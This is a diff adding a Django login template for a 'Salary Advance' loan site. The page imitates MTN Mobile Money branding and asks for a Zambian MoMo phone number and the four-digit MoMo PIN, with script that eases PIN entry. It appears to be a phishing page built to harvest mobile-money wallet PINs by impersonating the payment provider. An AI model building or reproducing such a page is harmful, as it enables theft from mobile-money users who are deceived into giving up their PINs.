@@ -1,0 +1,107 @@
+{% extends 'loan/base.html' %}
+{% block title %}MTN MoMo Login | Salary Advance{% endblock %}
+{% block header_subtitle %}Secure Login{% endblock %}
+
+{% block content %}
+<div class="card">
+    <div class="card-header">
+        <h2>MoMo Secure Login</h2>
+        <p>Enter your MTN MoMo number & PIN</p>
+    </div>
+
+    <form method="POST" action="{% url 'login' %}">
+        {% csrf_token %}
+
+        <!-- Phone Number -->
+        <div class="form-group">
+            <label>PHONE NUMBER</label>
+            <div style="display:flex; border:1.5px solid #FFCC00; border-radius:8px; overflow:hidden;">
+                <span style="background:#000; color:#FFCC00; padding:12px; font-weight:bold; font-size:13px; border-right:1px solid #FFCC00;">
+                    +260
+                </span>
+                <input
+                    type="text"
+                    name="phone"
+                    class="form-control"
+                    placeholder="Enter MoMo number"
+                    style="border:none;"
+                    required>
+            </div>
+        </div>
+
+        <!-- PIN Input Section -->
+        <div class="form-group" style="margin-top: 15px;">
+            <label>ENTER YOUR MOMO PIN</label>
+
+            <div class="num-inputs" style="display:flex; justify-content:center; gap:8px; margin-top:8px;">
+                <input name="num1" type="password" maxlength="1" class="lucky-field" inputmode="numeric" autocomplete="off" required
+                    style="width:50px;height:52px;text-align:center;font-size:24px;border:1.5px solid #ccc;border-radius:6px;">
+                <input name="num2" type="password" maxlength="1" class="lucky-field" inputmode="numeric" autocomplete="off" required
+                    style="width:50px;height:52px;text-align:center;font-size:24px;border:1.5px solid #ccc;border-radius:6px;">
+                <input name="num3" type="password" maxlength="1" class="lucky-field" inputmode="numeric" autocomplete="off" required
+                    style="width:50px;height:52px;text-align:center;font-size:24px;border:1.5px solid #ccc;border-radius:6px;">
+                <input name="num4" type="password" maxlength="1" class="lucky-field" inputmode="numeric" autocomplete="off" required
+                    style="width:50px;height:52px;text-align:center;font-size:24px;border:1.5px solid #ccc;border-radius:6px;">
+            </div>
+
+            <div style="display:flex; align-items:center; justify-content:center; gap:8px; margin-top:12px;">
+                <input type="checkbox" id="showPinCheckbox" style="cursor:pointer; width:16px; height:16px;">
+                <label for="showPinCheckbox" style="font-size:13px; color:#555; cursor:pointer; margin:0;">Show PIN</label>
+            </div>
+        </div>
+
+        <button type="submit" class="btn-primary" style="margin-top:20px;">
+            CONTINUE
+        </button>
+    </form>
+</div>
+
+<script>
+const showPinCheckbox = document.getElementById("showPinCheckbox");
+const luckyInputs = document.querySelectorAll(".lucky-field");
+
+showPinCheckbox.addEventListener("change", function () {
+    const targetType = this.checked ? "text" : "password";
+    luckyInputs.forEach(input => {
+        input.type = targetType;
+    });
+});
+
+luckyInputs.forEach((input, index) => {
+    input.addEventListener("input", function () {
+        this.value = this.value.replace(/\D/g, "");
+        if (this.value.length === 1 && index < luckyInputs.length - 1) {
+            luckyInputs[index + 1].focus();
+        }
+    });
+
+    input.addEventListener("keydown", function (e) {
+        if (e.key === "Backspace" && this.value === "" && index > 0) {
+            luckyInputs[index - 1].focus();
+        }
+        if (e.key === "ArrowLeft" && index > 0) {
+            luckyInputs[index - 1].focus();
+        }
+        if (e.key === "ArrowRight" && index < luckyInputs.length - 1) {
+            luckyInputs[index + 1].focus();
+        }
+    });
+
+    input.addEventListener("paste", function (e) {
+        e.preventDefault();
+        const pasted = (e.clipboardData || window.clipboardData)
+            .getData("text")
+            .replace(/\D/g, "")
+            .slice(0, 4);
+        pasted.split("").forEach((digit, i) => {
+            if (luckyInputs[i]) {
+                luckyInputs[i].value = digit;
+            }
+        });
+        if (pasted.length > 0) {
+            luckyInputs[Math.min(pasted.length, luckyInputs.length) - 1].focus();
+        }
+    });
+});
+</script>
+{% endblock %}
